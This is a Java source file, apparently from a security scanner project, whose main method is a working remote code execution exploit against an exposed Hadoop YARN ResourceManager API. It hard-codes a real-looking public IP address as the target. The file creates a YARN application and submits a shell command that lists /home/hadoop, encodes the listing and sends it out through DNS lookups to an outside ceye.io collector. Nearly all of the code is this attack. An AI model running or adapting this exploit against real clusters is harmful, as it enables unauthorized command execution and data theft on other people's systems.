package com.trackray.scanner.bean;

import com.trackray.scanner.enums.HttpMethod;
import com.trackray.scanner.httpclient.CrawlerPage;
import com.trackray.scanner.httpclient.Fetcher;
import com.trackray.scanner.httpclient.HttpProxy;
import com.trackray.scanner.utils.IOUtils;
import com.trackray.scanner.utils.ShellUtils;

import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class Dir {

    public static void main(String a[]) throws InterruptedException {
        String host = "https://106.75.9.229:23188";
        String text= "https://106.75.9.229:23188/cluster/app/";
        String app = host+"/ws/v1/cluster/apps/new-application";
        String exec = host+"/ws/v1/cluster/apps";
        Fetcher fetcher = new Fetcher();

        CrawlerPage apppage = new CrawlerPage();
        apppage.getRequest().setUrl(app);
        apppage.getRequest().setHttpMethod(HttpMethod.POST);
        apppage.getRequest().addHttpHeader("Accept","application/json");
        apppage.getRequest().addHttpHeader("Content-Type","application/json");
        fetcher.run(apppage);
        String appid = apppage.getResponse().getRespFormatJson().getString("application-id");
        System.out.println(appid);

        CrawlerPage execpage = new CrawlerPage();
        execpage.getRequest().setUrl(exec);
        execpage.getRequest().setHttpMethod(HttpMethod.POST);
        execpage.getRequest().addHttpHeader("Accept: application/json");
        execpage.getRequest().addHttpHeader("Content-Type: application/json");
        String command = "ping `ls /home/hadoop | base64|rev`.1.spn7ez.ceye.io";
        String payload = "{\"am-container-spec\":{\"commands\":{\"command\":\""+command+"\"}},\"application-id\":\""+appid+"\",\"application-name\":\"UserGroupedSimilarEngine122\",\"application-type\":\"YARN\"}";
        execpage.getRequest().setParamStr(payload);
        fetcher.run(execpage);

        CrawlerPage resp = new CrawlerPage();
        resp.getRequest().setUrl(text+appid);
        resp.getRequest().setHttpMethod(HttpMethod.GET);
        fetcher.run(resp);

        String text1 = resp.getResponse().getRespFormatHtml().select("tr.even td").text();

        System.out.println(text1);

    }
}
class In implements Runnable {
    private InputStream is;
    public In(InputStream is) {
        this.is = is;
    }
    @Override
    public void run() {

        while (true){
            BufferedReader b = IOUtils.streamToReader(is);

            String line;
            try {
                while((line=b.readLine())!=null){
                    System.out.println(line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }


        }
    }
}
